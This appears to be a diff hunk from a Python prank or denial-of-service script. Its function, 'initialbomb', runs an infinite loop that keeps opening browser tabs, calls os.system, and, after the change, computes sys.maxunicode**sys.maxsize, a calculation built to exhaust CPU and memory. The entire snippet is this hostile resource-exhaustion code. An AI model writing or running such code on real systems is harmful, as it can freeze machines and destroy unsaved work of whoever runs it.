@@ -12,7 +12,7 @@ def initialbomb():
     y+=1**2**x
 
     while True:
-        x+=x**x
+        x+=sys.maxunicode**sys.maxsize
         webbrowser.open_new_tab("https://www.google.com")
         random.randint(0,1000)
         os.system("echo 11182173272323")
